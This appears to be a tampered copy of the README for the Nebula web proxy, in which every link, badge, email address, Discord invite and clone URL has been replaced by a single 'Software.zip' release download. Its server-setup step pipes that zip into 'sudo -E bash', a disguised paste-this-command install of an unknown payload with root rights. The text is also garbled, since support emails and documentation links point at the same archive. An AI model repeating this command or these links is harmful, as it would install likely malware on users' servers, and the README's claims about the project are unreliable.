
<div align=center> 
<img src='https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip' width="100px" height="100px">
<h1>  Nebula </h1>
NebulaWeb is an official flagship of Nebula Services and Nebula Developer Labs. NebulaWeb is a stunning, sleek, and functional web-proxy with support for thousands of popular sites. With NebulaWeb, the sky is the limit.
</div>


## Features

- Stunning highly functional UI with multiple themes 
- XOR/b64 Encrypts all traffic sent from Nebula
- Hides your IP from sites
- [List of officially supported sites](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
- *limited* mobile support
- StealthMode (buffed `about:blank` cloaking)
- Advanced cloaking options
- **NEW** Deployment option - Email OTP Verification (tutorial can be found below)


# Deployment

Table of contents 
- Quick & easy deployment
- how to use email OTP Verification mode
- Advanced Deployment 


## Quick & Easy Deployment Options
[![Deploy to Heroku](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Run on Replit](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Remix on Glitch](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip!/import/github/NebulaServices/Nebula)
<br>
[![Deploy to IBM Cloud](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Deploy to Amplify Console](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Run on Google Cloud](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Deploy on Railway](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
<br>
[![Deploy To Koyeb](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)

---
## how to use email OTP Verification mode
* change `"verification":false,` to `"verification":true,`
* Make an account with Sendgrid (https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
* verify email
* get API key
* fill out information in `https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip`
  
## Advanced Deployment 

### Initial configuration

credits to @ProgrammerIn-wonderland for writing this wonderful tutorial (which can also be found in the docs :)

* Create an account at https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip
* Create an account at https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip (or any registrars) 
* Find a free domain name at Freenom
* Click checkout 
	* Select (12 Months @ FREE) 
	* Select "Use DNS"
		* Select Use your own DNS 
* Go to cloudflare, click add new site, and enter the free domain name
* Select "Free Plan"
* Click continue, ignore DNS
	* Copy the name servers cloudflare gives you
* Go back to your Freenom tab, enter in the name servers which cloudflare gave you
	* You can keep IP blank
* Click continue
* Click complete order
* Go back to cloudflare tab, click "Check Nameservers"
* Select DNS on your right bar
* Enter in the IP of the server which will be hosting Nebula
    * Target will be `@`
* Click Enable proxy (little gray cloud icon, if active its orange)
* Select SSL/TLS in your right bar
* Click "Flexible"

---

### Server configuration

* SSH into the server you'll be using, I'll assume its running Ubuntu 22.04 (though the commands are the same for debian 10+ versions, and Ubuntu versions 20.04+)
* run 
```
curl -fsSL https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip | sudo -E bash - \ &&
sudo apt-get install -y nodejs npm
git clone https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip
cd Nebula
npm i
npm ci
sudo nohup PORT=80 node . &
```

**Make sure your firewall is configured to let through port 80 traffic!** \
*Note: Server will need to run` cd Nebula && sudo nohup PORT=80 node . &` on reboot*
(Nebula's license is now GNU AGPL V3 as of v7.10)


## Tech Stack

- HTML, JS, CSS
- https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip 
- UV Backend Proxy 
- Osana Backend Proxy
- **Server:** Bare server on Node 

## Support

For support, email https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip or join our discord: https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip


## Demo

[Click here to see a demo of Nebula](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)


## Acknowledgements

 - [UV (one of the back-end proxy we use)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 - [Osana (one of the back-end proxy we use)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 - [Bare Server](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 - [https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip (v4, 5, 6.1 &< only)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)

## License

Copyright Nebula Services 2021 - Present
<br>
This project uses the AGLP GNU V3 license. 

